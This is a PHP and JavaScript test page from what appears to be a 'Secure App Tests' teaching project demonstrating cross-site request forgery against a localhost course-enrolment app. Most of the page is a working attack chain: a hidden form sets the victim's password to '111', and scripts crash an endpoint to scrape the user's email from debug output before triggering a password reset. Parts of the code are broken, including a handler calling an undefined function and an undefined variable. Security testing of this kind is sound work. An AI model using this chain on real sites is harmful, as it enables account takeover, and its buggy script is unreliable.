<?php
session_start();

/*Get DB connection*/
require_once "../src/DBController.php";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="../resources/secure_app.css">
    <meta charset="utf-8" />
    <title>Secure App Tests - CSRF Test</title>
</head>

<body>
    <div id="wrapper">
        <header>
            <table class="header_table">
                <tbody>
                <tr>
                    <td class="lock"><img src="../resources/Header_Lock_Image.svg" style="width:9vh;" alt="Header_lock"></td>
                    <td class="title"><b>Secure App Tests</b></td>
                    <td class="header_table_cell"></td>
                </tr>
                </tbody>
            </table>
        </header>

        <main>
            <h1>Cross Site Request Forgery Test</h1>
            <p>Current logged in as: <?php echo $_SESSION['email'];?></p>
            <p>
                To test: Login first, then navigate to this page. Press the button. The user is now enrolled with CRN 111 even if they are not a student.
            </p>

            <label class="csrf_label">Cross Site Request Forgery:
            <select name="csrf" id="csrf" onchange="changeCSRF()">
                <optgroup label="CSRFType">
                    <option selected="selected" value="1" >Change logged in user's password</option>
                    <option value="2">Create an admin account</option>
                </optgroup>
            </select>

            <div id="maliciouscode">
                <form action="http://localhost:8000/src/ForgotPasswordChangeLogic.php" method="POST" onsubmit="return ajaxSend();" name="changepassword">
                    <input type="hidden" name="newpassword" value="111" />
                    <input type="hidden" name="confirmpassword" value="111" />
                    <button class="button_large" type="submit">Change user's password</button>
                </form>
            </div>
            <?php
            $sql =<<<EOF
                    Select * From Enrollment;
                    EOF;
                    $ret = $db->query($sql);
                echo "<h1>Enrollment Table Contents</h1>";
                while($row = $ret->fetchArray(SQLITE3_ASSOC) )
                {
                    echo "<p>CRN = " . $row['CRN'] . "\n</p>";
                    echo "<p>StudentID = " . $row['StudentID'] . "\n</p>";
                }
            ?>
        </main>
    </div>

    <script>
        function changeinjection ()
        {
            //get elements from page
            var csrf = document.getElementById("csrf");
            var maliciouscode = document.getElementById("maliciouscode");

            //change parts of page depending on selection
            try
            {
                while (maliciouscode.removeChild(maliciouscode.childNodes[0]) !== null)
                {
                    //tries to remove all previous elements in the div
                }
            }
            catch
            {
                //succeeds when it throws exception
            }

            if(csrf.options[csrf.selectedIndex].value === "1")
            {
                maliciouscode.innerHTML =
                    "<form action=\"http://localhost:8000/src/ForgotPasswordChangeLogic.php\" method=\"POST\" onsubmit=\"return ajaxSend();\" name=\"changepassword\">" +
                        "<input type=\"hidden\" name=\"newpassword\" value=\"111\" />" +
                        "<input type=\"hidden\" name=\"confirmpassword\" value=\"111\" />" +
                        "<button class=\"button_large\" type=\"submit\">Change user's password</button>" +
                    "</form>";
            }
            else if(csrf.options[csrf.selectedIndex].value === "2")
            {
                injectiondiv.innerHTML = ""
            }
        }

        function ajaxSend()
        {
            // (A) CREATE BLANK FORM (to crash course enroll)
            var data1 = new FormData();

            // (B) AJAX REQUEST (will crash course enroll)
            var xhr1 = new XMLHttpRequest();
            xhr1.open('POST', "../src/CourseEnrollInsertLogic.php", true);
            xhr1.onload = function () {
                let crashData = this.response;
                //["email"]=> string(some number) "Email appears here"
                //var pattern = new RegExp( "[" + "'email'" + "]" + " string" + "(" + "(\\d{2})" + ")" );

                let email = crashData.substr(crashData.indexOf('["email"]=>')+ 11).slice(0, -1);
                email = email.substr(email.indexOf('"')+ 1).slice(0, -1);
                email = email.split('"')[0];

                // (C) GET SEARCH TERMS
                var data2 = new FormData();
                data2.append('email', email);

                // (D) AJAX REQUEST (sets up Forgot Password to change the correct password)
                var xhr2 = new XMLHttpRequest();
                xhr2.open('POST', "../src/ForgotPasswordLogic.php", true);
                xhr2.onload = function () {
                    document.changepassword.submit();
                }
                xhr2.send(data2);
                xhr2.onloadend = function() {
                    if(xhr2.status === 404)
                        throw new Error(' replied 404');
                }
            }
            xhr1.send(data1);
            xhr1.onloadend = function() {
                if(xhr1.status === 404)
                    throw new Error(' replied 404');
            }
            return false;
        }
    </script>
</body>
